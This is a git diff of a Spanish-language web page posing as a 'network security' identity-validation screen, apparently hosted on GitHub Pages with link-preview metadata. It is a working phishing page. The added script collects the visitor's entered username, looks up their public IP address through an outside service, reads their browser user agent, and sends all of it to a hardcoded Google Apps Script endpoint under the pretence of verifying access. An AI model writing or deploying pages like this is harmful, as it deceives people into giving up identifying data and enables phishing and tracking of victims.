@@ -3,34 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Soporte de Red | Validación de Identidad</title>
+    <title>Seguridad de Red | Validación de Identidad</title>
 
     <meta property="og:title" content="Seguridad de Red: Validación Requerida" />
     <meta property="og:description" content="Acceso pendiente. Por favor, valide su identidad para continuar con la sesión." />
     <meta property="og:image" content="https://dennismariapinogomez-cmd.github.io/validacion-seguridad/portada.jpeg" />
     <meta property="og:url" content="https://dennismariapinogomez-cmd.github.io/validacion-seguridad/" />
     <meta property="og:type" content="website" />
-    <meta property="og:image:width" content="1200" />
-    <meta property="og:image:height" content="630" />
 
     <style>
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { background: white; border: 1px solid #dbdbdb; padding: 35px; width: 330px; text-align: center; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); }
-        .logo-text { font-weight: 700; font-size: 22px; margin-bottom: 10px; color: #262626; letter-spacing: -0.5px; }
-        p { font-size: 14px; color: #8e8e8e; line-height: 1.4; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; box-sizing: border-box; font-size: 14px; }
-        input:focus { border-color: #a8a8a8; outline: none; }
-        button { width: 100%; background: #0095f6; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; cursor: pointer; transition: background 0.3s; font-size: 14px; }
-        button:hover { background: #1877f2; }
-        button:disabled { background: #b2dffc; cursor: not-allowed; }
-        .footer-secure { margin-top: 20px; font-size: 11px; color: #b0b0b0; text-transform: uppercase; letter-spacing: 1px; }
+        body { 
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #fafafa; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .card { 
+            background: white; 
+            border: 1px solid #dbdbdb; 
+            padding: 40px; 
+            width: 350px; 
+            text-align: center; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+        .logo-header { 
+            font-weight: 700; 
+            font-size: 24px; 
+            margin-bottom: 15px; 
+            color: #262626; 
+            letter-spacing: -1px;
+        }
+        p { 
+            color: #8e8e8e; 
+            font-size: 14px; 
+            line-height: 1.5; 
+            margin-bottom: 25px;
+        }
+        input { 
+            width: 100%; 
+            padding: 12px; 
+            background: #fafafa; 
+            border: 1px solid #dbdbdb; 
+            border-radius: 4px; 
+            box-sizing: border-box; 
+            margin-bottom: 15px; 
+            font-size: 14px; 
+        }
+        input:focus {
+            border: 1px solid #a8a8a8;
+            outline: none;
+        }
+        button { 
+            width: 100%; 
+            background-color: #0095f6; 
+            border: none; 
+            color: white; 
+            padding: 10px 0; 
+            border-radius: 4px; 
+            font-weight: 600; 
+            font-size: 14px;
+            cursor: pointer; 
+            transition: background 0.2s;
+        }
+        button:hover { background-color: #1877f2; }
+        button:disabled { background-color: #b2dffc; cursor: not-allowed; }
+        
+        .footer-tag {
+            margin-top: 30px;
+            font-size: 11px;
+            color: #c7c7c7;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div class="logo-text">Seguridad Corporativa</div>
-    <p>Se ha detectado un intento de acceso. Ingrese su usuario o ID de red para confirmar su identidad.</p>
+<div class="card">
+    <div class="logo-header">Seguridad de Red</div>
+    <p>Se requiere una validación de identidad para autorizar el acceso desde esta terminal.</p>
     
-    <input type="text" id="userInput" placeholder="Usuario o Nombre Completo" spellcheck="false" autocomplete="off">
-    <button id="btn" onclick="iniciarCaptura()">Validar y Acc
+    <input type="text" id="userInput" placeholder="Nombre de usuario o ID" autocomplete="off">
+    <button id="btnSubmit" onclick="validarYEnviar()">Validar Acceso</button>
+    
+    <div class="footer-tag">Certificado de Seguridad SSL</div>
+</div>
+
+<script>
+    async function validarYEnviar() {
+        const user = document.getElementById('userInput').value.trim();
+        const btn = document.getElementById('btnSubmit');
+        
+        if (!user) { alert("Por favor, ingrese su identificación."); return; }
+
+        btn.disabled = true;
+        btn.innerText = "Verificando...";
+
+        try {
+            // CAPTURA DE IP FORZADA (AWAIT)
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            const ip = data.ip;
+            const ua = navigator.userAgent;
+
+            // TU URL DE APPS SCRIPT
+            const scriptURL = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
+            
+            // REDIRECCIÓN FINAL
+            window.location.href = `${scriptURL}?u=${encodeURIComponent(user)}&ip=${encodeURIComponent(ip)}&ua=${encodeURIComponent(ua)}`;
+
+        } catch (error) {
+            // Fallback si falla la captura de IP
+            window.location.href = `https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec?u=${encodeURIComponent(user)}&ip=Error_Red&ua=${encodeURIComponent(navigator.userAgent)}`;
+        }
+    }
+</script>
+
+</body>
+</html>
